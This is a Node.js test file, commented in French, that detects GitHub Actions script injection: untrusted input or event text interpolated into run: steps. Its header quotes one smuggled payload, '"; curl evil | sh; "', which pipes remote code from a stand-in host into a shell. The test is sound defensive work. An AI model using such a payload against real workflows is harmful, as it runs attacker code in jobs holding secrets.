/**
 * Un workflow GitHub ne recopie pas un texte libre dans un script shell.
 *
 * `${{ inputs.raison }}` est remplacé AVANT l'exécution du shell : une raison contenant
 * `"; curl evil | sh; "` devient du code, dans un job qui porte les secrets du forum
 * (audit du 09/10/2026, défaut D9). La règle : un texte libre passe par `env:` et se lit
 * `"$VARIABLE"` ; seuls les choix (`type: choice`) et les booléens se recopient.
 *
 * Pas de bibliothèque YAML (le dépôt n'a aucune dépendance de build) : une lecture par
 * indentation, suffisante pour les workflows de ce dépôt.
 *
 *   node --test scripts/workflows-injection.test.js
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const DOSSIER = path.join(__dirname, '..', '.github', 'workflows');

/** Contextes qu'un tiers écrit : titre, corps, branche, message… */
const CONTEXTES_TIERS = /\$\{\{\s*(github\.event\.(issue|pull_request|comment|review|head_commit|commits|pages|discussion)\b[^}]*|github\.head_ref|github\.event\.workflow_run\.head_branch)\s*\}\}/;

const indentation = (l) => l.length - l.trimStart().length;

/** Les entrées `workflow_dispatch` de type texte libre (tout sauf choice, boolean, environment). */
function entreesTexteLibre(lignes) {
  const libres = new Set();
  const debut = lignes.findIndex((l) => /^\s*inputs:\s*$/.test(l));
  if (debut === -1) return libres;
  const base = indentation(lignes[debut]);
  let courant = null;
  for (let i = debut + 1; i < lignes.length; i++) {
    const l = lignes[i];
    if (!l.trim() || l.trim().startsWith('#')) continue;
    if (indentation(l) <= base) break;
    const m = /^\s*([\w-]+):\s*$/.exec(l);
    if (m && indentation(l) === base + 2) { courant = { nom: m[1], type: 'string' }; libres.add(courant.nom); continue; }
    const t = /^\s*type:\s*(\w+)/.exec(l);
    if (t && courant) { if (['choice', 'boolean', 'environment'].includes(t[1])) libres.delete(courant.nom); }
  }
  return libres;
}

/** Pour une ligne, la clé YAML qui la contient : `run`, `env`, `with`… (la plus proche, moins indentée, ou la ligne même). */
function cleParente(lignes, i) {
  const propre = /^\s*(?:-\s+)?([\w-]+):/.exec(lignes[i]);
  if (propre && propre[1] === 'run') return 'run';
  const niveau = indentation(lignes[i]);
  for (let j = i - 1; j >= 0; j--) {
    if (!lignes[j].trim() || lignes[j].trim().startsWith('#')) continue;
    // Une ligne moins indentée qui n'est pas une clé est du texte du script (bloc `run: |`) : on remonte.
    if (indentation(lignes[j]) < niveau) {
      const m = /^\s*(?:-\s+)?([\w-]+):/.exec(lignes[j]);
      if (m) return m[1];
    }
  }
  return null;
}

/** Les expressions `${{ … }}` qui tombent dans un `run:` et y apportent du texte non maîtrisé. */
function injections(texte) {
  const lignes = texte.split(/\r?\n/);
  const libres = entreesTexteLibre(lignes);
  const fautes = [];
  lignes.forEach((l, i) => {
    if (l.trim().startsWith('#') || !l.includes('${{')) return;
    if (cleParente(lignes, i) !== 'run') return;
    for (const m of l.matchAll(/\$\{\{\s*([^}]+?)\s*\}\}/g)) {
      const expr = m[1];
      const entree = /^(?:github\.event\.)?inputs\.([\w-]+)$/.exec(expr);
      if ((entree && libres.has(entree[1])) || CONTEXTES_TIERS.test(m[0])) fautes.push(`ligne ${i + 1} : ${m[0]}`);
    }
  });
  return fautes;
}

test('aucun workflow ne recopie un texte libre ou un contexte tiers dans un run:', () => {
  const fautes = [];
  for (const f of fs.readdirSync(DOSSIER).filter((n) => /\.ya?ml$/.test(n))) {
    for (const x of injections(fs.readFileSync(path.join(DOSSIER, f), 'utf8'))) fautes.push(`${f} ${x}`);
  }
  assert.deepEqual(fautes, [], 'passer par env: puis "$VARIABLE" :\n' + fautes.join('\n'));
});

test('forum.yml lit la raison par une variable d’environnement', () => {
  const t = fs.readFileSync(path.join(DOSSIER, 'forum.yml'), 'utf8');
  assert.match(t, /^\s+RAISON:\s*\$\{\{\s*inputs\.raison\s*\}\}\s*$/m);
  assert.match(t, /--raison="\$RAISON"/);
  assert.doesNotMatch(t, /--raison="\$\{\{/);
});

test('le détecteur sait voir une injection (témoin) et laisse passer ce qui est sûr', () => {
  const mauvais = [
    'on:', '  workflow_dispatch:', '    inputs:', '      raison:', '        type: string',
    'jobs:', '  j:', '    steps:', '      - run: |', '          echo "${{ inputs.raison }}"',
  ].join('\n');
  assert.equal(injections(mauvais).length, 1);
  const monoligne = ['on:', '  workflow_dispatch:', '    inputs:', '      x:', '        type: string', 'jobs:', '  j:', '    steps:', '      - run: echo ${{ inputs.x }}'].join('\n');
  assert.equal(injections(monoligne).length, 1);
  const continuation = [
    'on:', '  workflow_dispatch:', '    inputs:', '      raison:', '        type: string', 'jobs:', '  j:', '    steps:',
    '      - name: x', '        run: |', '          node s.js "a" \\', '            --raison="${{ inputs.raison }}" \\', '            --b',
  ].join('\n');
  assert.equal(injections(continuation).length, 1, 'ligne de continuation d’un bloc run');
  const titre = ['jobs:', '  j:', '    steps:', '      - run: |', '          echo "${{ github.event.issue.title }}"'].join('\n');
  assert.equal(injections(titre).length, 1);
  const bon = [
    'on:', '  workflow_dispatch:', '    inputs:', '      raison:', '        type: string', '      projet:', '        type: choice',
    'jobs:', '  j:', '    steps:', '      - name: x', '        env:', '          RAISON: ${{ inputs.raison }}',
    '        run: |', '          node s.js "${{ inputs.projet }}" --raison="$RAISON"',
  ].join('\n');
  assert.deepEqual(injections(bon), []);
});
